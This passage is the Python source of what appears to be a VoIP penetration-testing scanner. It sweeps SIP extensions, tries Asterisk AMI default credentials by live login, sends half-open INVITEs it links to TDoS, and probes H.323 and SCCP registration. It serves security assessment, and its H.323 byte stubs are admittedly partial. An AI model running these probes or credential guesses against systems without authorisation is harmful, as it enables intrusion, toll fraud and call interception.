#!/usr/bin/env python3
"""
SIP Enumeration Module — Ablation

Attack surfaces synthesized from:
  Hacking Exposed Unified Communications & VoIP Security Secrets & Solutions
  Ch04 — SIP/Extension enumeration (REGISTER/OPTIONS/INVITE differential response)
  Ch07 — TDoS: INVITE without ACK, OPTIONS flood, half-open dialog resource exhaustion
  Ch11 — RTP interception: SDP body parsing, media IP/port extraction, unencrypted streams
  Ch13 — Cisco UCM/CME default credentials, SCCP/SIP admin surfaces
  Ch14 — SIP fuzzing, flooding, protocol disruption

Enumeration primitives:
  OPTIONS probe      — server fingerprint, Allow header, version disclosure (stealthy)
  REGISTER probe     — extension existence via 401 vs 403 vs 200 differential
  Unauthenticated    — REGISTER with no auth returns 200 → CRITICAL
  Extension range    — sweep extensions 100-N using REGISTER differential
  Asterisk AMI       — TCP 5038 banner + admin:admin default cred check
  SDP parsing        — extract RTP media IP/port from INVITE response bodies
  SRTP probe         — INVITE with RTP/AVP (unencrypted) → check if server accepts

Response code semantics (from book ch04):
  401 Unauthorized   — extension EXISTS, auth required (Kamailio/Asterisk default)
  403 Forbidden      — extension DOES NOT EXIST on some deployments (Trixbox/FreePBX)
  200 OK             — extension exists AND accepts unauthenticated access (CRITICAL)
  404 Not Found      — extension does not exist (INVITE/OPTIONS method)
  486 Busy Here      — extension exists, currently in use
"""

import socket
import re
import time
import random
import string
import uuid


# ---------------------------------------------------------------------------
# SIP message builder helpers
# ---------------------------------------------------------------------------

def _branch() -> str:
    """RFC 3261 branch token: must start with z9hG4bK."""
    return 'z9hG4bK' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


def _call_id(domain: str) -> str:
    """Generate a Call-ID value per RFC 3261."""
    return uuid.uuid4().hex + '@' + domain


def _tag() -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


def _get_local_ip() -> str:
    """Best-effort local IP discovery without external requests."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'


def _build_options(host: str, port: int, local_ip: str,
                   target_extension: str = '100') -> str:
    """
    Build a SIP OPTIONS request targeting an extension.

    OPTIONS is the stealthiest enumeration method (ch04): it is required by
    RFC 3261 and supported by all SIP services.  A 200 OK with a Server/
    User-Agent header leaks the platform; a 404 means the extension is absent
    on many deployments.
    """
    br = _branch()
    cid = _call_id(host)
    from_tag = _tag()
    lines = [
        f'OPTIONS sip:{target_extension}@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
        'Max-Forwards: 70',
        f'From: <sip:scanner@{local_ip}>;tag={from_tag}',
        f'To: <sip:{target_extension}@{host}>',
        f'Call-ID: {cid}',
        'CSeq: 1 OPTIONS',
        f'Contact: <sip:scanner@{local_ip}:5060>',
        'Accept: application/sdp',
        'Content-Length: 0',
        '',
        '',
    ]
    return '\r\n'.join(lines)


def _build_register(host: str, port: int, local_ip: str,
                    extension: str) -> str:
    """
    Build an unauthenticated SIP REGISTER request.

    Differential response analysis (ch04):
      Valid extension on Trixbox/FreePBX  → 401 Unauthorized
      Invalid extension on Trixbox/FreePBX → 403 Forbidden
      Valid extension on Kamailio         → 401 for both valid/invalid
      Accepts with no auth                → 200 OK (CRITICAL)
    """
    br = _branch()
    cid = _call_id(host)
    from_tag = _tag()
    lines = [
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
        'Max-Forwards: 70',
        f'From: <sip:{extension}@{host}>;tag={from_tag}',
        f'To: <sip:{extension}@{host}>',
        f'Call-ID: {cid}',
        'CSeq: 1 REGISTER',
        f'Contact: <sip:{extension}@{local_ip}:5060>',
        'Expires: 3600',
        'Content-Length: 0',
        '',
        '',
    ]
    return '\r\n'.join(lines)


def _build_invite_sdp(host: str, port: int, local_ip: str,
                      target_extension: str,
                      local_rtp_port: int = 49172,
                      use_srtp: bool = False) -> str:
    """
    Build a SIP INVITE with an SDP body offering RTP/AVP (unencrypted).

    Per ch11 and ch14: if the server responds 200 OK with RTP/AVP in its
    SDP answer, the call will use unencrypted RTP.  If it responds 488
    (Not Acceptable Here) or 606 (Not Acceptable) the server requires SRTP.

    Note: this probe initiates but never completes the dialog (no ACK sent).
    The resulting half-open dialog consumes PBX resources — exactly the
    mechanism described in ch07 for resource exhaustion / TDoS.  The probe
    sends one INVITE and reads the response only; it does not sustain the
    dialog.
    """
    br = _branch()
    cid = _call_id(host)
    from_tag = _tag()

    if use_srtp:
        media_line = f'm=audio {local_rtp_port} RTP/SAVP 0\r\na=rtpmap:0 PCMU/8000'
    else:
        media_line = f'm=audio {local_rtp_port} RTP/AVP 0\r\na=rtpmap:0 PCMU/8000'

    sdp = (
        'v=0\r\n'
        f'o=scanner 0 0 IN IP4 {local_ip}\r\n'
        's=session\r\n'
        f'c=IN IP4 {local_ip}\r\n'
        't=0 0\r\n'
        f'{media_line}\r\n'
    )
    sdp_bytes = len(sdp.encode('utf-8'))

    lines = [
        f'INVITE sip:{target_extension}@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
        'Max-Forwards: 70',
        f'From: <sip:scanner@{local_ip}>;tag={from_tag}',
        f'To: <sip:{target_extension}@{host}>',
        f'Call-ID: {cid}',
        'CSeq: 1 INVITE',
        f'Contact: <sip:scanner@{local_ip}:5060>',
        'Content-Type: application/sdp',
        f'Content-Length: {sdp_bytes}',
        '',
        sdp,
    ]
    return '\r\n'.join(lines)


# ---------------------------------------------------------------------------
# Low-level transport
# ---------------------------------------------------------------------------

def _send_udp_sip(host: str, port: int, message: str,
                  timeout: float = 5.0) -> str:
    """Send a SIP message over UDP and return the first response (or '')."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(message.encode('utf-8'), (host, port))
        data, _ = sock.recvfrom(65535)
        sock.close()
        return data.decode('utf-8', errors='replace')
    except (socket.timeout, OSError):
        return ''


def _parse_status_code(response: str) -> int:
    """Extract the SIP response status code from the first line."""
    if not response:
        return 0
    m = re.match(r'^SIP/2\.0\s+(\d{3})', response.strip())
    if m:
        return int(m.group(1))
    return 0


def _parse_header(response: str, header: str) -> str:
    """Extract the value of a named SIP header (case-insensitive)."""
    pattern = re.compile(r'^' + re.escape(header) + r'\s*:\s*(.+)$',
                         re.IGNORECASE | re.MULTILINE)
    m = pattern.search(response)
    return m.group(1).strip() if m else ''


# ---------------------------------------------------------------------------
# SDP media extraction (ch11 — RTP interception)
# ---------------------------------------------------------------------------

def parse_sdp_media(sip_response: str) -> dict:
    """
    Extract RTP media parameters from the SDP body of a SIP response.

    Returns dict with keys: media_ip, media_port, codec, profile.
    An empty dict means no SDP body was found or parsing failed.

    Relevant to ch11: once media_ip and media_port are known for an
    unencrypted (RTP/AVP) session, the stream can be intercepted by any
    node on the path between the endpoints.
    """
    result = {}
    # Split headers from body on blank line
    parts = re.split(r'\r\n\r\n|\n\n', sip_response, maxsplit=1)
    if len(parts) < 2:
        return result
    body = parts[1]

    # connection: c=IN IP4 <addr>
    c_match = re.search(r'^c=IN\s+IP4\s+(\S+)', body, re.MULTILINE)
    if c_match:
        result['media_ip'] = c_match.group(1)

    # media: m=audio <port> <profile> <payload>
    m_match = re.search(r'^m=audio\s+(\d+)\s+(RTP/\S+)\s+(\d+)', body, re.MULTILINE)
    if m_match:
        result['media_port'] = int(m_match.group(1))
        result['profile'] = m_match.group(2)   # RTP/AVP or RTP/SAVP
        result['codec_num'] = int(m_match.group(3))

    # rtpmap: a=rtpmap:<num> <name>/<rate>
    a_match = re.search(r'^a=rtpmap:\d+\s+(\S+)', body, re.MULTILINE)
    if a_match:
        result['codec'] = a_match.group(1)

    return result


# ---------------------------------------------------------------------------
# Main enumerator class
# ---------------------------------------------------------------------------

class SIPEnumerator:
    """
    Enumerate SIP server exposure: banner, extension range, auth bypass,
    Asterisk AMI default creds, and RTP encryption posture.
    """

    def __init__(self, host: str, port: int = 5060, timeout: float = 5.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.findings: list = []
        self.transport = 'UDP'
        self._local_ip = _get_local_ip()

    # -----------------------------------------------------------------------
    # Internal helpers
    # -----------------------------------------------------------------------

    def _finding(self, severity: str, title: str, detail: str) -> dict:
        return {
            'severity': severity,
            'title': title,
            'detail': detail,
            'host': self.host,
            'port': self.port,
        }

    def _send(self, message: str) -> str:
        return _send_udp_sip(self.host, self.port, message, self.timeout)

    # -----------------------------------------------------------------------
    # Probe: SIP server presence + version/method disclosure
    # -----------------------------------------------------------------------

    def probe_sip_server(self) -> list:
        """
        Send OPTIONS to sip:<host> and parse the response.

        Findings produced:
          MEDIUM — SIP server responding to unauthenticated OPTIONS
          LOW    — Server/User-Agent header leaks platform version
          LOW    — Allow header enumerates supported methods
        """
        findings = []
        msg = _build_options(self.host, self.port, self._local_ip, '100')
        response = self._send(msg)
        code = _parse_status_code(response)

        if code == 0:
            return findings  # no response — not a SIP server or filtered

        findings.append(self._finding(
            'MEDIUM',
            'SIP server responding to unauthenticated OPTIONS',
            f'SIP/{self.transport} {self.host}:{self.port} returned {code} to '
            f'unauthenticated OPTIONS. Confirms active SIP service.'
        ))

        # Server / User-Agent header (ch04: reveals phone platform)
        for hdr in ('Server', 'User-Agent'):
            val = _parse_header(response, hdr)
            if val:
                findings.append(self._finding(
                    'LOW',
                    f'SIP version disclosure via {hdr} header',
                    f'{hdr}: {val} — reveals platform and version string '
                    f'useful for CVE targeting.'
                ))
                break

        # Allow header — enumerate supported methods
        allow = _parse_header(response, 'Allow')
        if allow:
            methods = [m.strip() for m in allow.split(',')]
            interesting = [m for m in methods
                           if m.upper() in ('SUBSCRIBE', 'NOTIFY', 'PUBLISH',
                                            'INFO', 'MESSAGE', 'REFER')]
            if interesting:
                findings.append(self._finding(
                    'LOW',
                    'SIP Allow header exposes additional methods',
                    f'Allow: {allow} — methods {interesting} may expose '
                    f'additional attack surface (presence, messaging, DTMF).'
                ))

        return findings

    # -----------------------------------------------------------------------
    # Probe: unauthenticated REGISTER
    # -----------------------------------------------------------------------

    def check_unauthenticated_register(self) -> list:
        """
        Send REGISTER for extension 100 with no credentials.

        200 OK → CRITICAL: server accepts registration without authentication.
        This allows an attacker to hijack extension routing and receive calls
        destined for the legitimate extension (ch04, ch11/registration hijacking).
        """
        findings = []
        msg = _build_register(self.host, self.port, self._local_ip, '100')
        response = self._send(msg)
        code = _parse_status_code(response)

        if code == 200:
            findings.append(self._finding(
                'CRITICAL',
                'SIP server accepts unauthenticated REGISTER',
                f'Extension 100 REGISTER returned 200 OK with no credentials. '
                f'Attacker can register any extension, intercept inbound calls, '
                f'and perform registration hijacking (RFC 3261 §20.10 exploit).'
            ))
        return findings

    # -----------------------------------------------------------------------
    # Probe: extension enumeration via REGISTER differential
    # -----------------------------------------------------------------------

    def enumerate_extensions(self, start: int = 100,
                              end: int = 110) -> list:
        """
        Sweep extensions [start, end) using REGISTER differential response.

        Per ch04:
          401 Unauthorized → extension EXISTS (auth required)
          200 OK           → extension EXISTS, no auth (CRITICAL per-extension)
          403 Forbidden    → extension DOES NOT EXIST (Trixbox/FreePBX pattern)
          404 Not Found    → extension does not exist
          Other / timeout  → inconclusive

        A baseline probe against a known-bad extension establishes the
        server's invalid-user response code before classifying the rest.
        """
        findings = []

        # Baseline: probe a highly unlikely extension to determine invalid response
        baseline_ext = 'fakesipuser99999'
        baseline_msg = _build_register(self.host, self.port,
                                       self._local_ip, baseline_ext)
        baseline_resp = self._send(baseline_msg)
        invalid_code = _parse_status_code(baseline_resp)

        # If invalid response is 0 (no response), server may be filtered/down
        if invalid_code == 0:
            return findings

        confirmed_extensions = []
        unauth_extensions = []

        for ext in range(start, end):
            ext_str = str(ext)
            msg = _build_register(self.host, self.port,
                                  self._local_ip, ext_str)
            response = self._send(msg)
            code = _parse_status_code(response)

            if code == 200:
                unauth_extensions.append(ext_str)
            elif code == 401 and invalid_code != 401:
                # 401 for this ext but not for invalid → extension exists
                confirmed_extensions.append(ext_str)
            elif code == 401 and invalid_code == 401:
                # Both valid and invalid return 401 (Kamailio pattern) —
                # can't discriminate via REGISTER; skip
                pass
            elif code == 403 and invalid_code == 403:
                # Both return 403 — server returns same code regardless
                pass
            elif code not in (0, 403, 404) and code != invalid_code:
                confirmed_extensions.append(ext_str)

            time.sleep(0.1)  # light throttle — avoid tripping IPS rate limits

        if unauth_extensions:
            findings.append(self._finding(
                'CRITICAL',
                'Extensions accept unauthenticated REGISTER',
                f'Extensions {unauth_extensions} returned 200 OK to REGISTER '
                f'with no credentials. Full registration hijack possible.'
            ))

        if confirmed_extensions:
            findings.append(self._finding(
                'HIGH',
                f'SIP extension enumeration: {len(confirmed_extensions)} extensions confirmed',
                f'Extensions {confirmed_extensions} differentiate from invalid '
                f'user baseline (invalid code={invalid_code}). Confirmed active '
                f'extensions with auth required. Enables targeted brute-force, '
                f'INVITE flood, and toll fraud (ch04 svwar technique).'
            ))

        return findings

    # -----------------------------------------------------------------------
    # Probe: Asterisk AMI default credentials (ch13)
    # -----------------------------------------------------------------------

    def check_ami_interface(self) -> list:
        """
        Probe Asterisk Manager Interface on TCP port 5038.

        AMI banner: "Asterisk Call Manager/X.Y.Z"
        Default creds: admin:admin, admin:amp111, admin:password

        A successful auth allows:
          - Originate calls (toll fraud)
          - List SIP peers (extension enumeration)
          - Execute system commands via Asterisk dialplan
        """
        findings = []
        ami_port = 5038
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'amp111'),
            ('admin', 'password'),
            ('admin', ''),
        ]

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, ami_port))
            banner = sock.recv(1024).decode('utf-8', errors='replace').strip()

            if 'Asterisk Call Manager' not in banner:
                sock.close()
                return findings

            findings.append(self._finding(
                'MEDIUM',
                'Asterisk Manager Interface (AMI) exposed',
                f'TCP {self.host}:{ami_port} — {banner}. AMI provides '
                f'programmatic control over Asterisk: call origination, '
                f'peer listing, dialplan execution.'
            ))

            # Try default credentials
            for username, secret in default_creds:
                auth_cmd = (
                    f'Action: Login\r\n'
                    f'Username: {username}\r\n'
                    f'Secret: {secret}\r\n'
                    f'\r\n'
                )
                sock.sendall(auth_cmd.encode('utf-8'))
                time.sleep(0.5)
                auth_resp = b''
                try:
                    auth_resp = sock.recv(4096)
                except socket.timeout:
                    pass
                resp_str = auth_resp.decode('utf-8', errors='replace')
                if 'Response: Success' in resp_str:
                    findings.append(self._finding(
                        'CRITICAL',
                        f'Asterisk AMI default credentials accepted ({username}:{secret})',
                        f'AMI login succeeded with {username}:{secret}. '
                        f'Attacker can originate calls (toll fraud), enumerate '
                        f'all SIP extensions via "Action: SIPpeers", and '
                        f'execute arbitrary dialplan logic.'
                    ))
                    break

            sock.close()

        except (socket.timeout, OSError, ConnectionRefusedError):
            pass

        return findings

    # -----------------------------------------------------------------------
    # Probe: SRTP posture via INVITE with RTP/AVP (ch11, ch14)
    # -----------------------------------------------------------------------

    def check_srtp_required(self) -> list:
        """
        Send INVITE with SDP offering RTP/AVP (unencrypted G.711).

        Interpretation:
          200 OK with RTP/AVP in answer → MEDIUM: server accepts unencrypted RTP.
            Media IP/port extracted from SDP for eavesdrop surface assessment.
          488 Not Acceptable Here       → LOW: server rejects unencrypted offer
            (may require SRTP/SAVP).
          No response / other           → inconclusive.

        This probe creates a half-open dialog (INVITE without ACK).  The
        PBX must time out the dialog internally, consuming resources —
        the same mechanism exploited in TDoS via INVITE flood (ch07).
        """
        findings = []
        msg = _build_invite_sdp(
            self.host, self.port, self._local_ip,
            target_extension='100',
            local_rtp_port=random.randint(49152, 65000),
            use_srtp=False,
        )
        response = self._send(msg)
        code = _parse_status_code(response)

        if code == 0:
            return findings

        if code == 200:
            sdp_info = parse_sdp_media(response)
            detail = (
                f'Server returned 200 OK to INVITE offering RTP/AVP (unencrypted). '
                f'Call would use cleartext RTP — eavesdropping possible on any '
                f'intermediate network segment (ch11 UCSniff/Ettercap technique).'
            )
            if sdp_info.get('media_ip') and sdp_info.get('media_port'):
                detail += (
                    f' SDP answer: media={sdp_info["media_ip"]}:'
                    f'{sdp_info["media_port"]}'
                    f' profile={sdp_info.get("profile", "unknown")}'
                    f' codec={sdp_info.get("codec", "unknown")}.'
                )
            findings.append(self._finding(
                'MEDIUM',
                'SIP server accepts unencrypted RTP (SRTP not enforced)',
                detail
            ))

        elif code in (488, 606):
            findings.append(self._finding(
                'LOW',
                'SRTP enforcement detected (server rejected RTP/AVP offer)',
                f'Server returned {code} to INVITE with RTP/AVP. '
                f'SRTP likely required. Confirms media encryption policy active.'
            ))

        elif code == 401:
            # Server challenged auth before processing SDP — common on hardened deployments
            findings.append(self._finding(
                'LOW',
                'SIP INVITE requires authentication',
                f'Server returned 401 to unauthenticated INVITE. '
                f'Auth required before call processing — reduces anonymous flood surface.'
            ))

        return findings

    # -----------------------------------------------------------------------
    # Orchestrator
    # -----------------------------------------------------------------------

    def enumerate_all(self) -> dict:
        """
        Run all SIP enumeration probes and return aggregated findings.

        Probe order:
          1. probe_sip_server()          — OPTIONS fingerprint
          2. check_unauthenticated_register() — instant REGISTER bypass check
          3. enumerate_extensions()      — REGISTER differential sweep
          4. check_ami_interface()       — Asterisk AMI default creds
          5. check_srtp_required()       — RTP/SRTP posture via INVITE
        """
        findings = []
        findings.extend(self.probe_sip_server())
        findings.extend(self.check_unauthenticated_register())
        findings.extend(self.enumerate_extensions())
        findings.extend(self.check_ami_interface())
        findings.extend(self.check_srtp_required())
        self.findings = findings
        return {
            'host': self.host,
            'port': self.port,
            'transport': self.transport,
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Standalone voice-protocol inspection bypass detection functions
# (H.323, SCCP/Skinny, extended SIP OPTIONS, RTP media range, WebRTC/TURN/STUN)
# Synthesized from:
#   Cisco Firewalls (Moraes) ch12 — Application Inspection: CBAC, ZBF, deep
#     packet inspection policies; stateful fixup behavior, ALG bypass surface
#   Cisco Firewalls (Moraes) ch13 — Inspection of Voice Protocols: SIP, H.323,
#     SCCP/Skinny; NAT fixup, RAS gating, unauth call-signaling exposure
# ---------------------------------------------------------------------------


def probe_h323_service(host: str, port: int = 1720,
                       timeout: float = 5.0) -> list:
    """
    H.323 RAS/call-signaling exposure probe.

    TCP/1720 — Q.931/H.225 call signaling (ch13: Cisco ASA inspects H.323
    and performs NAT fixup; firewall bypass possible when inspection disabled
    or misconfigured).  Sends a minimal H.323 Setup TPKT frame; any response
    confirms an active H.323 call-signaling port.

    UDP/1719 — H.225 RAS (Registration, Admission, Status).  GatekeeperRequest
    (GRQ) discovers whether a gatekeeper is present and whether it confirms
    endpoint registration without challenge.

    Findings:
      MEDIUM   — H323_CALL_SIGNALING_ACTIVE   (any TCP/1720 response)
      MEDIUM   — H323_GATEKEEPER_RESPONDS     (any RAS UDP/1719 response)
      HIGH     — H323_GATEKEEPER_UNAUTH_CONFIRM (GCF without auth challenge)
    """
    import struct

    findings: list = []

    # --- TCP/1720: minimal H.323 Setup (TPKT + Q.931 + stub H.225 UUIE) ---
    # TPKT header: version=3, reserved=0, length covers the stub payload.
    # The payload is a Q.931 Call Reference + a stub H.225 Setup UUIE tag.
    # Any valid H.323 endpoint will respond (Alerting, Connect, or ReleaseComplete).
    stub_q931 = (
        b'\x05\x04'          # Q.931: Call Reference length=1, value=0x04 (caller flag set)
        b'\x05'              # Q.931 message type: Setup (0x05)
        b'\x28'              # Bearer capability IE tag
        b'\x03'              # IE length = 3
        b'\x80\x90\xa3'      # Bearer: speech, G.711 mu-law
        b'\x7e'              # User-User IE (H.225 UUIE) tag
        b'\x05'              # IE length = 5
        b'\x05\x04\x03\x02\x01'  # stub ASN.1 PER Setup UUIE (not valid ASN.1;
                             # enough to trigger a protocol response)
    )
    total_len = 4 + len(stub_q931)
    tpkt = struct.pack('>BBH', 0x03, 0x00, total_len) + stub_q931

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(tpkt)
        response = b''
        try:
            response = sock.recv(1024)
        except socket.timeout:
            pass
        sock.close()
        if response:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'H323_CALL_SIGNALING_ACTIVE',
                'detail': (
                    f'TCP {host}:{port} responded to H.323 Setup TPKT frame '
                    f'({len(response)} bytes). Active H.323 call-signaling port '
                    f'confirmed. Cisco ASA/IOS ZBF inspection policies gate this '
                    f'port; absence of h323-inspect class-map leaves signaling '
                    f'and media pinhole management uncontrolled (ch12, ch13).'
                ),
                'host': host,
                'port': port,
            })
    except (socket.timeout, OSError, ConnectionRefusedError):
        pass

    # --- UDP/1719: H.225 RAS GatekeeperRequest (GRQ) ---
    # Minimal ASN.1 PER-encoded GRQ: protocolIdentifier + rasAddress + endpointType=terminal
    # seqNum=1; gatekeeperIdentifier absent (optional in GRQ per H.225 §7.3).
    # A real gatekeeper returns GCF (Gatekeeper Confirm) or GRJ (Gatekeeper Reject).
    grq = (
        b'\x00\x01'          # sequenceNumber = 1
        b'\x00'              # requestSeqNum high byte (H.225 uses 16-bit seqNum)
        b'\x08'              # H.225 message type: GatekeeperRequest (tag 8 in RasMessage CHOICE)
        b'\x00'              # protocolIdentifier (abbreviated; gatekeeper ignores malformed)
        b'\x00\x00'          # stub rasAddress: SEQUENCE OF TransportAddress, 0 entries
        b'\x60'              # endpointType: terminal (bit-string 0x60 in PER)
    )
    ras_port = 1719
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(grq, (host, ras_port))
        try:
            data, _ = sock.recvfrom(4096)
            # GCF tag in RasMessage CHOICE is 9 (0x09); GRJ is 10 (0x0A)
            if len(data) >= 4:
                msg_type = data[3] if len(data) > 3 else 0
                if msg_type == 0x09:
                    # Gatekeeper Confirm — endpoint was registered without auth challenge
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'H323_GATEKEEPER_UNAUTH_CONFIRM',
                        'detail': (
                            f'UDP {host}:{ras_port} returned GatekeeperConfirm (GCF) '
                            f'to unauthenticated GRQ. Gatekeeper accepted endpoint '
                            f'without RAS authentication (H.235 not enforced). '
                            f'Attacker can register, hijack calls, and bypass '
                            f'admission control (ch13 H.323 gatekeeper inspection).'
                        ),
                        'host': host,
                        'port': ras_port,
                    })
                else:
                    findings.append({
                        'severity': 'MEDIUM',
                        'title': 'H323_GATEKEEPER_RESPONDS',
                        'detail': (
                            f'UDP {host}:{ras_port} responded to H.225 RAS GRQ '
                            f'({len(data)} bytes, msg_type=0x{msg_type:02x}). '
                            f'H.323 gatekeeper active. RAS port exposure enables '
                            f'endpoint registration enumeration and admission bypass '
                            f'probing (ch13).'
                        ),
                        'host': host,
                        'port': ras_port,
                    })
            else:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'H323_GATEKEEPER_RESPONDS',
                    'detail': (
                        f'UDP {host}:{ras_port} responded to H.225 RAS GRQ '
                        f'({len(data)} bytes). H.323 gatekeeper active.'
                    ),
                    'host': host,
                    'port': ras_port,
                })
        except socket.timeout:
            pass
        sock.close()
    except OSError:
        pass

    return findings


def probe_sccp_skinny(host: str, port: int = 2000,
                      timeout: float = 5.0) -> list:
    """
    Cisco SCCP (Skinny Client Control Protocol) exposure probe.

    TCP/2000 — SCCP unencrypted.  RegisterMessage (msg_id=0x0001) sent with
    station identifier, instance, IP, max_streams, and protocol_version=17.
    Packet format: [4-byte length LE][4-byte reserved=0][4-byte msg_id LE][data].

    Ch13: Cisco ASA skinny inspection class-map gates SCCP; if inspection is
    absent, the UCM/CME phone registration surface is fully exposed.

    TCP/2443 — SCCP over TLS.  TLS accept without client cert = unauthenticated
    channel to the phone signaling plane.

    Findings:
      CRITICAL — SCCP_UNAUTH_REGISTER_ACCEPTED  (RegisterACK 0x0081 returned)
      LOW      — SCCP_PORT_OPEN                 (RegisterREJ 0x009D or any response)
      LOW      — SCCP_TLS_ACTIVE                (TCP/2443 TLS handshake accepted)
    """
    import struct

    findings: list = []

    # --- TCP/2000: SCCP RegisterMessage ---
    # station_identifier: 16 null bytes (device name field)
    # instance = 1 (uint32 LE)
    # station_ip = 0.0.0.0 (uint32 LE = 0)
    # max_streams = 0 (uint32 LE)
    # protocol_version = 17 (uint32 LE; v17 = SCCP 17.x, used by CUCM 12+)
    station_id = b'\x00' * 16
    msg_data = station_id + struct.pack('<IIII', 1, 0, 0, 17)
    msg_id = 0x0001  # RegisterMessage
    reserved = 0
    length = 4 + 4 + len(msg_data)  # reserved(4) + msg_id(4) + data
    packet = struct.pack('<III', length, reserved, msg_id) + msg_data

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(packet)
        response = b''
        try:
            response = sock.recv(1024)
        except socket.timeout:
            pass
        sock.close()

        if len(response) >= 12:
            # Parse response msg_id from bytes 8-12 (LE uint32)
            resp_msg_id = struct.unpack_from('<I', response, 8)[0]
            if resp_msg_id == 0x0081:  # RegisterAck
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'SCCP_UNAUTH_REGISTER_ACCEPTED',
                    'detail': (
                        f'TCP {host}:{port} returned RegisterACK (0x0081) to '
                        f'unauthenticated SCCP RegisterMessage. UCM/CME accepted '
                        f'phone registration without credentials. Attacker can '
                        f'impersonate a Cisco IP phone, intercept calls, and '
                        f'inject SCCP control messages (ch13 skinny inspection '
                        f'bypass when class-map absent).'
                    ),
                    'host': host,
                    'port': port,
                })
            elif resp_msg_id == 0x009D:  # RegisterRej
                findings.append({
                    'severity': 'LOW',
                    'title': 'SCCP_PORT_OPEN',
                    'detail': (
                        f'TCP {host}:{port} returned RegisterREJ (0x009D). '
                        f'SCCP service active and reachable; registration rejected '
                        f'(auth or device policy enforced).'
                    ),
                    'host': host,
                    'port': port,
                })
            elif response:
                findings.append({
                    'severity': 'LOW',
                    'title': 'SCCP_PORT_OPEN',
                    'detail': (
                        f'TCP {host}:{port} responded to SCCP RegisterMessage '
                        f'(msg_id=0x{resp_msg_id:04x}, {len(response)} bytes). '
                        f'SCCP service active.'
                    ),
                    'host': host,
                    'port': port,
                })
        elif response:
            findings.append({
                'severity': 'LOW',
                'title': 'SCCP_PORT_OPEN',
                'detail': (
                    f'TCP {host}:{port} responded to SCCP RegisterMessage '
                    f'({len(response)} bytes, too short to parse msg_id). '
                    f'SCCP service likely active.'
                ),
                'host': host,
                'port': port,
            })
    except (socket.timeout, OSError, ConnectionRefusedError):
        pass

    # --- TCP/2443: SCCP TLS ---
    tls_port = 2443
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(timeout)
        tls_sock = ctx.wrap_socket(raw, server_hostname=host)
        tls_sock.connect((host, tls_port))
        tls_sock.close()
        findings.append({
            'severity': 'LOW',
            'title': 'SCCP_TLS_ACTIVE',
            'detail': (
                f'TCP {host}:{tls_port} accepted TLS handshake (SCCP/TLS). '
                f'Encrypted phone signaling plane reachable. Verify mutual TLS '
                f'and LSC/MIC certificate enforcement (ch13).'
            ),
            'host': host,
            'port': tls_port,
        })
    except (socket.timeout, OSError, ConnectionRefusedError):
        pass
    except Exception:
        pass

    return findings


def probe_sip_options_extended(host: str, port: int = 5060,
                               timeout: float = 5.0) -> list:
    """
    Extended SIP OPTIONS enumeration — dangerous method detection.

    Sends a SIP OPTIONS request with Contact and Accept headers; parses the
    Allow: header in the response for methods that expand the attack surface
    beyond basic call setup.

    Ch12/ch13: Cisco ZBF SIP inspection can restrict methods via match sip
    request-method; if the policy is absent or incomplete, these methods pass
    uncontrolled through the firewall inspection layer.

    Findings:
      MEDIUM — SIP_INVITE_ALLOWED     (TDoS: INVITE without ACK flood)
      MEDIUM — SIP_SUBSCRIBE_ALLOWED  (presence info disclosure)
      HIGH   — SIP_REFER_ALLOWED      (unauthenticated call transfer)
      LOW    — SIP_NOTIFY_ALLOWED
    """
    findings: list = []
    local_ip = _get_local_ip()

    br = _branch()
    cid = _call_id(host)
    from_tag = _tag()
    lines = [
        f'OPTIONS sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
        'Max-Forwards: 70',
        f'From: <sip:scanner@{local_ip}>;tag={from_tag}',
        f'To: <sip:{host}>',
        f'Call-ID: {cid}',
        'CSeq: 1 OPTIONS',
        f'Contact: <sip:scanner@{local_ip}:5060>',
        'Accept: application/sdp, application/pidf+xml, text/plain',
        'Content-Length: 0',
        '',
        '',
    ]
    msg = '\r\n'.join(lines)
    response = _send_udp_sip(host, port, msg, timeout)

    if not response:
        return findings

    allow_val = ''
    for hdr_name in ('Allow', 'Allow:'):
        m = re.search(r'^Allow\s*:\s*(.+)$', response, re.IGNORECASE | re.MULTILINE)
        if m:
            allow_val = m.group(1).strip()
            break

    if not allow_val:
        return findings

    methods = {m.strip().upper() for m in allow_val.split(',')}

    if 'INVITE' in methods:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_INVITE_ALLOWED — TDoS possible',
            'detail': (
                f'SIP OPTIONS Allow: header at {host}:{port} includes INVITE. '
                f'Unauthenticated INVITE flood creates half-open dialogs, '
                f'exhausting PBX session tables (ch13 TDoS; ZBF inspect '
                f'sip-inv-flood rate-limit absent).'
            ),
            'host': host,
            'port': port,
        })

    if 'SUBSCRIBE' in methods:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_SUBSCRIBE_ALLOWED — presence info disclosure',
            'detail': (
